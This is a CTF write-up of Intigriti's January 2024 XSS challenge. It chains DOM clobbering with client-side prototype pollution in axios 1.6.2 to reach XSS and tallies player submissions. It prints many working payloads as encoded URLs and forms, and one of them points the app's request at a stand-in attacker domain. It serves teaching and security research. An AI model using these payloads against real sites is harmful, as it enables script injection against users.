---
name: Intigriti January Challenge (2024)
authors: Kévin - Mizu
category: XSS, Prototype Pollution
link: https://challenge-0124.intigriti.io
description: Writeup for the Intigriti January 2024 challenge 💥
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# 01-24: DOM Clobbering, CSPP (axios) and XSS

| Name                                                                      | Authors                                        | Category                 |
| ------------------------------------------------------------------------- | ---------------------------------------------- | ------------------------ |
| [Intigriti January Challenge (2024)](https://challenge-0124.intigriti.io) | [Kévin - Mizu](https://twitter.com/kevin_mizu) | XSS, Prototype Pollution |

[![VIDEO](https://img.youtube.com/vi/sqlI-Tm-Bpg/0.jpg)](https://youtu.be/sqlI-Tm-Bpg)

## Challenge Description

> Find a way to execute arbitrary javascript on the iFramed page and win Intigriti swag.

## Source Code Review

The challenge provides source code adhering to the following structure.

```bash
├── docker-compose.yaml
├── Dockerfile
└── src
    ├── app.js
    ├── package.json
    ├── repos.json
    ├── static
    │   ├── css
    │   │   └── main.css
    │   ├── img
    │   │   ├── loading.gif
    │   │   └── pattern.svg
    │   └── js
    │       ├── axios.min.js
    │       └── jquery-3.7.1.min.js
    └── views
        ├── inc
        │   └── header.ejs
        ├── index.ejs
        └── search.ejs
```

#### app.js

```js
const createDOMPurify = require("dompurify");
const repos = require("./repos.json");
const { JSDOM } = require("jsdom");
const express = require("express");
const path = require("path");

const app = express();
app.set("view engine", "ejs");
app.set("view cache", false);
app.use(express.json());
const PORT = 3000;

const window = new JSDOM("").window;
const DOMPurify = createDOMPurify(window);

app.use("/static", express.static(path.join(__dirname, "static")));

app.get("/", (req, res) => {
    if (!req.query.name) {
        res.render("index");
        return;
    }
    res.render("search", {
        name: DOMPurify.sanitize(req.query.name, { SANITIZE_DOM: false }),
        search: req.query.search,
    });
});

app.post("/search", (req, res) => {
    name = req.body.q;
    repo = {};

    for (let item of repos.items) {
        if (item.full_name && item.full_name.includes(name)) {
            repo = item;
            break;
        }
    }
    res.json(repo);
});

app.listen(PORT, () => {
    console.log(`App listening on port ${PORT}!`);
});
```

Thankfully, we don't have too much code to analyse in the server-side `app.js` file.

The app uses [JSDOM](https://github.com/jsdom/jsdom#--------jsdom) and [DOMPurify](https://github.com/cure53/DOMPurify#dompurify). We should check the versions used; perhaps there are some known vulnerabilities 🔎

#### package.json

```json
"dependencies": {
    "dompurify": "^3.0.6",
    "ejs": "^3.1.9",
    "express": "^4.18.2",
    "jsdom": "^23.0.1"
}
```

Probably not. The version numbers are all prefixed with a `^` meaning `use this version or above`. Therefore, any future updates that patch the vulnerable library would also break the challenge. If one of the libraries were intentionally vulnerable, we'd expect to see a fixed version number beside it.

Returning to app.js, there are two endpoints. The first is `/`, which accepts GET requests. If there's no `name` parameter, it will render `index`. Otherwise, it will render `search`.

```js
app.get("/", (req, res) => {
    if (!req.query.name) {
        res.render("index");
        return;
    }
    res.render("search", {
        name: DOMPurify.sanitize(req.query.name, { SANITIZE_DOM: false }),
        search: req.query.search,
    });
});
```

Something that stands out here is that the DOMPurify `sanitize` function is only used on one of the two query parameters (`name` but not `search`). Furthermore, the option `{ SANITIZE_DOM: false }` is supplied.

According to the [documentation](https://github.com/cure53/DOMPurify#influence-how-we-sanitize) this parameter will:

> disable DOM Clobbering protection on output (default is true, handle with care, minor XSS risks here)

OK, so [DOM Clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering) has been explicitly allowed for this parameter 📓✍ (update: the creator pointed out that disabling this option specifically allows us to overwrite document and HTMLFormElement attributes).

The second endpoint is `/search`, which accepts POST requests. It takes a `q` parameter that becomes `name` and refers to a "repo name". The function will essentially search a list of `repos` for a name that matches. If it finds one, it will return the result as a JSON object.

```js
app.post("/search", (req, res) => {
    name = req.body.q;
    repo = {};

    for (let item of repos.items) {
        if (item.full_name && item.full_name.includes(name)) {
            repo = item;
            break;
        }
    }
    res.json(repo);
});
```

The `repos.json` file contains 30 JSON objects split across \~3000 lines. Each object represents a repository and has many properties defining many properties about the repo and its owner.

The last potentially interesting file is the client-side `search.ejs`.

#### search.ejs

```html
<img src="/static/img/loading.gif" class="loading" width="50px" hidden /><br />
<img class="avatar" width="35%" />
<p id="description"></p>
<iframe id="homepage" hidden></iframe>

<script src="/static/js/axios.min.js"></script>
<script src="/static/js/jquery-3.7.1.min.js"></script>
<script>
    function search(name) {
        $("img.loading").attr("hidden", false);

        axios
            .post("/search", $("#search").get(0), {
                headers: { "Content-Type": "application/json" },
            })
            .then((d) => {
                $("img.loading").attr("hidden", true);
                const repo = d.data;
                if (!repo.owner) {
                    alert("Not found!");
                    return;
                }

                $("img.avatar").attr("src", repo.owner.avatar_url);
                $("#description").text(repo.description);
                if (repo.homepage && repo.homepage.startsWith("https://")) {
                    $("#homepage").attr({
                        src: repo.homepage,
                        hidden: false,
                    });
                }
            });
    }

    window.onload = () => {
        const params = new URLSearchParams(location.search);
        if (params.get("search")) search();

        $("#search").submit((e) => {
            e.preventDefault();
            search();
        });
    };
</script>
```

What makes it interesting, you ask? Firstly, the import of `axios.min.js` - [what is it](https://github.com/axios/axios#features) and why is it included here? Secondly, this is where most of our search functionality is located! Where there's functionality, there's bugs.. maybe? 🧐

Let's break down the code. When the page loads:

1. If the URL contains a `search` parameter, it's extracted, and the search function is triggered automatically
2. An event handler is attached to the `#search` form (monitoring for future searches)

When the `search()` function executes:

1. A POST request is made to the `/search` endpoint (using the `axios` library)
2. If the search query matches, the relevant repo data will be returned in JSON format
3. The `img.avatar` source will be set to `repo.owner.avatar_url`
4. The `description` text will be set to `repo.description`
5. If the repo `homepage` starts with `https://` the `homepage` source will be set to `repo.homepage` and `hidden` will be `false`

Now, back to the `axios.min.js`. We want to check for any known vulnerabilities, but because the JS is minified, there's no mention of the version anywhere in the project.

Therefore, I opted to load the challenge page, open devtools (F12), switch to the debugger and search for "version" in the minified axios file.

There are two references, the second of which stands out.

```js
return (
    (Qe.Axios = Ve),
    (Qe.CanceledError = Pe),
    (Qe.CancelToken = Ge),
    (Qe.isCancel = Te),
    (Qe.VERSION = ze),
    (Qe.toFormData = ne),
    (Qe.AxiosError = X),
    (Qe.Cancel = Qe.CanceledError),
    (Qe.all = function (e) {
        return Promise.all(e);
    })
);
```

I set a breakpoint here (line 2277) and refresh the page. The breakpoint triggers and reveals the version `1.6.2`.

[axios releases](https://github.com/axios/axios/releases) shows a recent release (5 days ago, at the time of this challenge release) [v1.6.4](https://github.com/axios/axios/releases/tag/v1.6.4) that fixed two bugs, both security related.

After some initial research, we determine that the [formToJSON prototype pollution vulnerability](https://github.com/axios/axios/issues/6167) warrants further exploration (axios is submitting a form, then returning JSON). Let's return to this later when we've formulated our attack plan.

## HTML Injection

Now we know what's going on in the code, let's visualise the site functionality.

Visiting `https://challenge-0124.intigriti.io/challenge?name=cat` presents the search page with the message `Hey cat, which repo are you looking for?`

`cat` is already in bold, so let's test for HTML injection by [adding an underline](https://challenge-0124.intigriti.io/challenge?name=%3Cu%3Ecat%3C%2Fu%3E).

```html
name=<u>cat</u>
```

It works! We have HTML injection ✅

Now, If I type `cat` in the repo search box, an alert pops up: `Not found!`

If I type a name from the `repos.json` file, e.g. `facebook` (or even `fb`), it displays the repo image and loads an iframe containing the repo information.

## DOM Clobbering

We have HTML injection, but what about the "DOM clobbering risk" mentioned in the DOMPurify docs? What is DOM clobbering anyway?

> a technique in which you inject HTML into a page to manipulate the Document Object Model (DOM) and ultimately change the behaviour of JavaScript on the page

Let's return to `search.ejs` and focus on this line of code momentarily.

```js
axios.post("/search", $("#search").get(0), {
    headers: { "Content-Type": "application/json" },
});
```

We can ask chatGPT for a breakdown 👀

-   **`axios.post("/search", $("#search").get(0), { ... })`:**
    -   `axios.post`: Initiates a POST request using the Axios library.
    -   `"/search"`: The URL or endpoint to which the POST request is sent.
    -   `$("#search").get(0)`: The data payload of the request. In this case, it takes the form element with the id 'search' and gets its first element (equivalent to the native JavaScript `document.getElementById('search')`). This is usually done to serialize the form data for submission.
    -   `{ "headers": { "Content-Type": "application/json" } }`: An optional configuration object that includes headers for the request. In this case, it sets the "Content-Type" header to "application/json", indicating that the payload being sent is in JSON format.

So `$("#search").get(0)` is taking the **form element with the id 'search' and getting its first element**? It sounds like a nice target for clobbering! If we can inject our own `search` form before the existing form on the page, it will be processed in the axios request instead of the intended one 💡

```html
name=
<form id="search"><input name="cat" value="is the best" /></form>
```

Providing we remember to [URL-encode the payload](https://challenge-0124.intigriti.io/challenge?name=%3Cform%20id%3D%22search%22%3E%3Cinput%20name%3D%22cat%22%20value%3D%27is%20the%20best%27%20%2F%3E%3C%2Fform%3E) here, it will work! The page loads with two `search` forms: our injected one and _then_ the original, intended one.

We can verify the new behaviour via the console.

```js
$("#search").get(0);
```

jQuery returns our injected form.

```html
<form id="search">​ 0: <input value="is the best" name="cat" /></form>
```

Now, what can we do with our clobbered search form? 🤔

## Client-side Prototype Pollution (CSPP)

We noted the [formToJSON prototype pollution vulnerability](https://github.com/axios/axios/issues/6167) in axios `1.6.2` earlier; let's investigate!

First, what is prototype pollution? Portswigger made an [article](https://portswigger.net/blog/finding-client-side-prototype-pollution-with-dom-invader) (including a great [video](https://www.youtube.com/watch?v=GeqVMOUugqY)) on client-side prototype pollution (CSSP) but in short:

> Prototype pollution is a vulnerability that occurs when you merge an object with a user-controlled JSON object. It can also occur as a result of an object generated from query/hash parameters, when the merge operation does not sanitize the keys.

Successful exploitation of prototype pollution requires the following key components:

-   [A prototype pollution source](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-sources) - This is any input that enables you to poison prototype objects with arbitrary properties.
-   [A sink](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-sinks) - A JavaScript function or DOM element that enables arbitrary code execution.
-   [An exploitable gadget](https://portswigger.net/web-security/prototype-pollution#prototype-pollution-gadgets) - This is any property that is passed into a sink without proper filtering or sanitization.

OK, good to know! Next, we [view changes](https://github.com/axios/axios/pull/6167/files/951e4c343c18220b4777fb68d224bf121c6514fb) and confirm the fix was a single line of code in the `formDataToJSON` function.

```js
function formDataToJSON(formData) {
    function buildPath(path, value, target, index) {
        let name = path[index++];

        if (name === '__proto__') return true; # ONE LINE FIX

        const isNumericKey = Number.isFinite(+name);
        const isLast = index >= path.length;
        name = !name && utils.isArray(target) ? target.length : name;
```

Reviewing the [entire code](https://github.com/DigitalBrainJS/axios/blob/951e4c343c18220b4777fb68d224bf121c6514fb/lib/helpers/formDataToJSON.js#L53) for the function it's clear that the fix will prevent any paths with the name `__proto__` from being processed by returning true as soon as they are found.

The developers also updated their test cases, giving us greater insight into how the attack would look.

```js
it("should resist prototype pollution CVE", () => {
    const formData = new FormData();

    formData.append("foo[0]", "1");
    formData.append("foo[1]", "2");
    formData.append("__proto__.x", "hack");
    formData.append("constructor.prototype.y", "value");

    expect(formDataToJSON(formData)).toEqual({
        foo: ["1", "2"],
        constructor: {
            prototype: {
                y: "value",
            },
        },
    });

    expect({}.x).toEqual(undefined);
    expect({}.y).toEqual(undefined);
});
```

We know from `search.ejs` that `axios.post()` will send a POST request to `/search` with an "application/json" header, then return the response in JSON. Therefore, if our input is processed by the `FormDataToJSON()` function, we could potentially exploit the CSPP in the `name` field.

Let's test our theory with a [benign payload](https://challenge-0124.intigriti.io/challenge?name=%3Cform%20id%3D%22search%22%3E%3Cinput%20name%3D%22__proto__%5Bcat%5D%22%20value%3D%27is%20the%20best%27%20%2F%3E%3C%2Fform%3E&search=test) (note, you can also use the dot syntax, e.g. `__proto__.cat`).

```html
name=
<form id="search"><input name="__proto__[cat]" value="is the best" /></form>
&search=test
```

Now, if we type `Object.prototype.cat`, `Object.cat` or simply `cat` in the developer tools console, it will display `is the best`. This is because the prototype has been polluted, so all objects will inherit our injected property 😈

From here, we might look for [useful script gadgets](https://github.com/BlackFan/client-side-prototype-pollution/) in jQuery (similar to the [06-23 challenge](https://www.youtube.com/watch?v=Marqe2SEYok)), but unfortunately, we won't find any documented gadgets that work in the case.

## Unintended Solutions

Since _nobody_ found the intended path, the creator deployed a [patched version of the challenge](https://twitter.com/kevin_mizu/status/1747566277244387636). At the end, we'll discuss the author's intended solution later and link another unintended solution that also worked on the patched version 🤯 First, lets evaluate at the 37 unintended solutions we received for the original challenge.

The unintended solutions are possible due to the following code snippet in `search.ejs` (removed in the patched version).

```js
if (repo.homepage && repo.homepage.startsWith("https://")) {
    $("#homepage").attr({
        src: repo.homepage,
        hidden: false,
    });
}
```

To exploit this vulnerable code, we must satisfy some conditions 👇

### Polluting the repo owner

Here's the first one. If the `repo.owner` isn't set, the function will return, and we can never reach the vulnerable code.

```js
const repo = d.data;
if (!repo.owner) {
    alert("Not found!");
    return;
}
```

Therefore, we pollute the prototype to include an `owner` property. Since `repo` is an object, it will inherit the property making `repo.owner == cat`. Remember you might need to [URL encode the payload](https://challenge-0124.intigriti.io/challenge?name=%3Cform%20id=%22search%22%3E%3Cinput%20name=%22__proto__[owner]%22%20value=%22cat%22%3E%3C/form%3E&search=test).

```html
name=
<form id="search"><input name="__proto__[owner]" value="cat" /></form>
&search=test
```

If you want to visualise this process, set a breakpoint at the if statement. When the execution pauses, swap to the console, enter`repo.owner` and confirm that the value is `cat`, as expected.

### Polluting the repo homepage

Here's the next condition. Set up another breakpoint and refresh the page; you should see that `repo.homepage` is `undefined`. If we want the code inside this if statement to execute, we must set a homepage and ensure it begins with `https://`.

```js
if (repo.homepage && repo.homepage.startsWith("https://")) {
    $("#homepage").attr({
        src: repo.homepage,
        hidden: false,
    });
}
```

We already saw we can pollute the `repo.owner`, so let's [repeat the process](https://challenge-0124.intigriti.io/challenge?name=%3Cform%20id%3D%22search%22%3E%3Cinput%20name%3D%22__proto__%5Bowner%5D%22%20value%3D%22cat%22%3E%3Cinput%20name%3D%22__proto__%5Bhomepage%5D%22%20value%3D%22https%3A%2F%2Fcrypto.cat%22%3E%3C%2Fform%3E&search=test) for `repo.homepage`.

```html
name=
<form id="search"><input name="__proto__[owner]" value="cat" /><input name="__proto__[homepage]" value="https://crypto.cat" /></form>
&search=test
```

It works! When the breakpoint triggers, we check the console and see that `repo.homepage` is set to `https://crypto.cat` (yes, I wish I owned this domain 😒).

The `src` of the `homepage` element is now set to `https://crypto.cat`. Scrolling up to the top of `search.ejs`, we can confirm that `homepage` refers to a hidden iframe.

```html
<iframe id="homepage" hidden></iframe>
```

If only we could set `repo.homepage` to `javascript:alert(document.domain)`, we would be finished already. Unfortunately, there doesn't appear to be any way to get around the `repo.homepage.startsWith("https://")` condition.

#### jQuery exception

Additionally, our new payload triggers the following exception in jQuery.

```js
Uncaught (in promise) TypeError: cannot use 'in' operator to search for "set" in "cat"
```

Interestingly, it's complaining about `cat`, which was the value of `owner`. However, it only does so when the `homepage` is also set, indicating that the code which sets the iframe attributes is to blame.

```js
$("#homepage").attr({
    src: repo.homepage,
    hidden: false,
});
```

Many players studied jQuery to understand the underlying cause of this error, a process made significantly easier through the use of [sourceMaps](https://web.dev/articles/source-maps), which negates the need to debug minified JS code. You can find several examples in [Community Writeups](#community-writeups) but [this one](https://jorianwoltjer.com/blog/h/hacking/intigriti-xss-challenge/intigriti-january-xss-challenge-0124#debugging-minimized-javascript-libraries) is nice 👌

TLDR; the loop inside `attr` will crash when trying to process strings. That includes our `owner` and `homepage` prototypes. In fact, `homepage` _must_ be a string in order to meet this requirement.

```js
if (repo.homepage && repo.homepage.startsWith("https://"))
```

We can verify this by [changing the prototypes to arrays](https://challenge-0124.intigriti.io/challenge?name=%3Cform%20id%3D%22search%22%3E%3Cinput%20name%3D%22__proto__%5Bowner%5D%5B%5D%22%20value%3D%22cat%22%3E%3Cinput%20name%3D%22__proto__%5Bhomepage%5D%5B%5D%22%20value%3D%22https%3A%2F%2Fcrypto.cat%22%3E%3C%2Fform%3E&search=test) (`for (i in key)` is valid for an array).

```html
name=
<form id="search"><input name="__proto__[owner][]" value="cat" /><input name="__proto__[homepage][]" value="https://crypto.cat" /></form>
&search=test
```

Now we get a new error because `homepage` needs to be a string 😺

```js
Uncaught (in promise) TypeError: repo.homepage.startsWith is not a function
```

Actually, there's another way to get around this error. If there are any uppercase characters in the attribute name, it will be converted using `toLowerCase`, which will change the execution flow in such a way that jQuery will skip the `i in []` check will. We [test it](https://challenge-0124.intigriti.io/challenge?name=%3Cform%20id%3D%22search%22%3E%3Cinput%20name%3D%22__proto__%5BOwneR%5D%22%20value%3D%22cat%22%3E%3Cinput%20name%3D%22__proto__%5BHOMEPAGE%5D%22%20value%3D%22https%3A%2F%2Fcrypto.cat%22%3E%3C%2Fform%3E&search=test) and confirm there are no errors!

```html
name=
<form id="search"><input name="__proto__[OwneR]" value="cat" /><input name="__proto__[HOMEPAGE]" value="https://crypto.cat" /></form>
&search=test
```

Of the 37 submissions, 24 polluted the `owner` and `homepage`. Soon, we'll see how the remaining 13 solutions bypassed these requirements (without abusing the jQuery caching, as intended).

For the solutions that did set the `owner` and `homepage`, it's around this point that they begin to diverge 🔎

### XSS

So, how can we get XSS in an iframe? [HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp#iframes-in-xss) suggests using `src` or `srcdoc`. The `src` attribute is already assigned `repo.homepage` (which must begin with `https://`), so let's try `srcdoc` 🤞

#### srcdoc

We submit our [URL-encoded payload](<https://challenge-0124.intigriti.io/challenge?name=%3Cform+id=%22search%22%3E%3Cinput+name=%22__proto__[srcdoc]%22+value=%22%3Cscript%3Ealert(document.domain)%3C/script%3E%22+/%3E%3Cinput+name=%22__proto__[owner]%22+value=%22cat%22+/%3E%3Cinput+name=%22__proto__[homepage]%22+value=%22https://crypto.cat%22+/%3E%3C/form%3E&search=test>)

```html
<form id="search">
    <input name="__proto__[srcdoc]" value="<script>alert(document.domain)</script>" />
    <input name="__proto__[owner]" value="cat" />
    <input name="__proto__[homepage]" value="https://crypto.cat" />
</form>
```

We don't get an alert 😿 But wait, what about that array trick we saw earlier? Let's change `[srcdoc]` to `[srcdoc][]`. Now [we get an alert](<https://challenge-0124.intigriti.io/challenge?name=%3Cform+id=%22search%22%3E%3Cinput+name=%22__proto__[srcdoc][]%22+value=%22%3Cscript%3Ealert(document.domain)%3C/script%3E%22+/%3E%3Cinput+name=%22__proto__[owner]%22+value=%22cat%22+/%3E%3Cinput+name=%22__proto__[homepage]%22+value=%22https://crypto.cat%22+/%3E%3C/form%3E&search=test>)!

Let's also try the uppercase trick; change `[srcdoc]` to `[Srcdoc]`. [It works too](<https://challenge-0124.intigriti.io/challenge?name=%3Cform+id=%22search%22%3E%3Cinput+name=%22__proto__[SRCDOC]%22+value=%22%3Cscript%3Ealert(document.domain)%3C/script%3E%22+/%3E%3Cinput+name=%22__proto__[owner]%22+value=%22cat%22+/%3E%3Cinput+name=%22__proto__[homepage]%22+value=%22https://crypto.cat%22+/%3E%3C/form%3E&search=test>)!

The order is important here. `srcdoc` must be specified in the URL _before_ the `owner` and `homepage`. A community member suggested the reasoning behind this - since `owner` and `homepage` are strings, they would fail somewhere in jQuery, halting execution. So long as `srcdoc` is processed first, it doesn't matter if the remaining properties fail (we only need them at the beginning of our attack to reach the vulnerable code).

A [popular alternative](<https://challenge-0124.intigriti.io/challenge?name=%3Cform+id=%22search%22%3E%3Cinput+name=%22__proto__[srcdoc]%22+value=%22fake%22+/%3E%3Cinput+name=%22__proto__[srcdoc]%22+value=%22%3Cscript%3Ealert(document.domain)%3C/script%3E%22+/%3E%3Cinput+name=%22__proto__[owner]%22+value=%22cat%22+/%3E%3Cinput+name=%22__proto__[homepage]%22+value=%22https://crypto.cat%22+/%3E%3C/form%3E&search=test>) to the array payload was to pollute the `srcdoc` twice. The underlying logic is the same, i.e. declaring `srcdoc` twice creates a `srcdoc[]` array containing both values.

#### src

Earlier, we said it would be great if we could just set the iframe `src` to `javascript:alert(document.domain)`. Well, we can't because the existing keys already define it. However, since [HTML attributes are case-insensitive and JS are not](https://jorianwoltjer.com/blog/h/hacking/intigriti-xss-challenge/intigriti-january-xss-challenge-0124#finding-gadgets-jquery), we can use our trusty [uppercase](<https://challenge-0124.intigriti.io/challenge?name=%3Cform+id=%22search%22%3E%3Cinput+name=%22__proto__[SRC]%22+value=%22javascript:alert(document.domain)%22+/%3E%3Cinput+name=%22__proto__[owner]%22+value=%22cat%22+/%3E%3Cinput+name=%22__proto__[homepage]%22+value=%22https://crypto.cat%22+/%3E%3C/form%3E&search=test>) trick to ensure the existing key won't overwrite our injected prototype.

```html
<form id="search">
    <input name="__proto__[SRC]" value="javascript:alert(document.domain)" />
    <input name="__proto__[owner]" value="cat" />
    <input name="__proto__[homepage]" value="https://crypto.cat" />
</form>
```

#### onload

A fairly straightforward alternative - you can pollute `onload` to set some JS to execute when the page loads! You'll still need to meet the previous conditions (pollute `owner` + `homepage` and use uppercase/array), [e.g.](<https://challenge-0124.intigriti.io/challenge?name=%3Cform+id=%22search%22%3E%3Cinput+name=%22__proto__[ONLOAD]%22+value=%22alert(document.domain)%22+/%3E%3Cinput+name=%22__proto__.owner%22+value=%22cat%22+/%3E%3Cinput+name=%22__proto__.homepage%22+value=%22https://crypto.cat%22+/%3E%3C/form%3E&search=test>)

```html
<form id="search">
    <input name="__proto__[ONLOAD]" value="alert(document.domain)" />
    <input name="__proto__[owner]" value="cat" />
    <input name="__proto__[homepage]" value="https://crypto.cat" />
</form>
```

#### ontransitionend

One [payload](<https://challenge-0124.intigriti.io/challenge?name=%3Csvg%20id=%22homepage%22%20style=%22transition:%20outline%201s%22%20tabindex=%221%22%3E%3C/svg%3E%3Cform%20id=%22search%22%3E%3Cinput%20name=%22__proto__.owner%22%20value=%22cat%22%20/%3E%3Cinput%20name=%22__proto__.homepage%22%20value=%22https://crypto.cat%22%3E%3Cinput%20name=%22__proto__.ontransitionend%22%20value=%22alert(document.domain)%22%20/%3E%3C/form%3E&search=test#homepage>) created and `<svg>` element with a transition style, then polluted `ontransitionend` with our XSS payload.

```html
<svg id="homepage" style="transition: outline 1s" tabindex="1"></svg>
<form id="search">
    <input name="__proto__.owner" value="cat" />
    <input name="__proto__.homepage" value="https://crypto.cat" />
    <input name="__proto__.ontransitionend" value="alert(document.domain)" />
</form>
&search=test#homepage
```

This one gets bonus points for being incredibly annoying (alert pops recurrently) 🥇

#### onerror

Finally, one [payload](<https://challenge-0124.intigriti.io/challenge?name=%3Csvg%3E%3Cimage%20id=homepage%3E%3C/svg%3E%3Cform%20id=search%3E%3Cinput%20name=__proto__.onerror%20value=%27alert(document.domain)%27%3E%3Cinput%20name=__proto__.href%20value=x%3E%3Cinput%20name=__proto__.owner%20value=cat%3E%3Cinput%20name=__proto__.homepage%20value=%27https://crypto.cat%27%3E%3C/form%3E&search=test>) polluted `onerror` with the XSS payload. To throw an error, it pollutes `href` with an invalid value, e.g. in the example below, it will try \[and fail] to load `https://challenge-0124.intigriti.io/x`

```html
<svg><image id=homepage></svg>
<form id=search>
    <input name="__proto__.onerror" value="alert(document.domain)" />
    <input name="__proto__.href" value="x" />
    <input name="__proto__.owner" value="cat" />
    <input name="__proto__.homepage" value="https://crypto.cat" />
</form>
```

These last two payloads negated the need for an array/uppercase property because the polluted values weren't already defined!

### Unintended - without polluting owner/homepage

Let's look at the 13 solutions that didn't pollute the `owner` or `homepage`; how did they get around it?

#### Clobbered 'q'

when `q` is set, it gets a real result from the server that satisfies the `owner` and `homepage` checks, so there's no need to pollute these values. Note that we still need to use the array/uppercase trick. The [example below](<https://challenge-0124.intigriti.io/challenge?name=%3Cform%20id%3Dsearch%3E%3Cinput%20name%3Dq%20value%3Dreact-d3%3E%20%3Cinput%20name%3D__proto__.srcdoc.0%20value%3D%22%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E%22%3E%20%3Cinput%20type%3Dsubmit%3E&search=test>) achieved this with a slightly different syntax.

```html
<form id="search">
    <input name="q" value="react-d3" />
    <input name="__proto__.srcdoc.0" value="<script>alert(document.domain)</script>" />
    <input type="submit" />
</form>
```

#### baseURL (attacker domain)

The `baseURL` can be polluted to a URL owned by the attacker, ensuring the `POST /search` will be directed there instead.

```html
<form id="search">
    <input name="__proto__[baseURL]" value=https://attacker.domain>
    <input name="__proto__[SRCDOC]" value="<script>alert(1)</script>" />
</form>
```

The `attacker.domain` should deliver a JSON object representing a repository. This example can be found in the repos.json file.

```json
{
    "owner": {
        "login": "cameronmcefee",
        "id": 72919,
        "node_id": "MDQ6VXNlcjcyOTE5",
        "avatar_url": "https://avatars.githubusercontent.com/u/72919?v=4",
        "gravatar_id": "",
        "url": "https://api.github.com/users/cameronmcefee"
    },
    "homepage": "https://example.com"
}
```

## Player Submission Analysis

Here's a table that breaks down all the \[unintended] payloads we received. You can mix and match, i.e. pick one row from each column, to construct your attack 🤓 The values in brackets represent the number of players that utilised that technique.

| Initial approach                        | CSPP gadget             | jQuery attr bypass |
| --------------------------------------- | ----------------------- | ------------------ |
| Pollute 'owner' and 'homepage' (**24**) | srcdoc (**21**)         | array (**18**)     |
| Pollute 'baseURL' (**3**)               | src (**1**)             | uppercase (**16**) |
| Clobber 'q' (**10**)                    | onload (**13**)         | other (**3**)      |
|                                         | ontransitionend (**1**) |                    |
|                                         | onerror (**1**)         |                    |

## Community Writeups

1. [rodriguezjorgex](https://medium.com/@rodriguezjorgex/how-i-passed-the-intigriti-0124-challenge-b6c2d1cd1b7b)
2. [jorianwoltjer](https://jorianwoltjer.com/blog/p/hacking/intigriti-xss-challenge/intigriti-january-xss-challenge-0124)
3. [realansgar](https://realansgar.dev/writeups/intigriti-xss-0124)
4. [smickovskid](https://damjan-smickovski.dev/blog/intigriti_challenge_0124_writeup)
5. [arturssmirnovs](https://github.com/arturssmirnovs/challenge-0124.intigriti.io-january-xss-challenge)
6. [sebastianosrt](https://gist.github.com/sebastianosrt/804b9145bf491ba76107d26d9869bdd9)
7. [sudistark](https://github.com/Sudistark/CTF-Writeups/blob/main/Intigriti-XSS-Challenges/2024/Jan.md)
8. [siss3l](https://gist.github.com/Siss3l/20d49beaa5fcfd025ff5fe9d2ed8724a)

## Intended Solution (patched challenge)

As mentioned earlier, the creator deployed a patched version of the challenge for a week after the event to give players the time to find the intended solution. I won't document it in detail here because this post is already quite long. Besides, I couldn't explain it better than Kevin, so why duplicate the effort 🤷‍♂️ I would therefore encourage you to check out the creators [official writeup](https://mizu.re/post/intigriti-january-2024-xss-challenge), but here's a quick TLDR;

The intended solution polluted the `baseURL`, a technique we observed in some earlier payloads. One slight difference is that the unintended solutions used `baseURL` to deliver a repo JSON object from an attacker domain. In contrast, the official solution sets the value to `data:,{}#`, allowing the response data to be controlled directly. The main difference in the approach, however, is the CSPP gadget used; the expectation was to [abuse jQuery selector caching](https://mizu.re/post/intigriti-january-2024-xss-challenge#gadgets).

To achieve this, it is first necessary to clobber `document.namespaceURI` so that jQuery thinks the document is non-HTML and falls back to our targeted `select` function. Next, the `selector` is polluted with a previously cached `img.loading` selector (to avoid crashes) and relative selectors are polluted to apply some custom rules, ensuring the selector will match everything. Finally, we set the `src` attribute to our XSS payload, which will apply to each DOM element, including the iframe. Here's the constructed payload for visualisation.

```html
<img name="namespaceURI" />
<form id="search">
    <input name="__proto__[baseURL]" value='data:,{"owner":{"avatar_url":"javascript:alert(1)"}}#' />
    <input name="__proto__[selector]" value="img.loading" />
    <input name="__proto__[TAG][dir]" value="ownerDocument" />
    <input name="__proto__[TAG][next]" value="parentNode" />
    <input name="__proto__[CLASS][dir]" value="nextSibling" />
    <input name="__proto__[CLASS][first]" value="true" />
</form>
```

## Unintended Solution (patched challenge)

When Kevin released v2 of the challenge [Johan](https://twitter.com/joaxcar) mentioned he had found an unintended solution that also worked on the patched version! The approach is a little complicated to summarise here, so I would encourage you to [give it a read](https://joaxcar.com/blog/2024/01/26/hunting-for-prototype-pollution-gadgets-in-jquery-intigriti-0124-challenge). Furthermore, the writeup provides a superb breakdown of the gadget hunting process 🧠

## Conclusion

We hope you enjoyed this writeup from [CryptoCat](https://www.youtube.com/@_CryptoCat)! Make sure to check back in February for the [valentine-themed challenge](https://twitter.com/intigriti/status/1747294022425596115) 💜
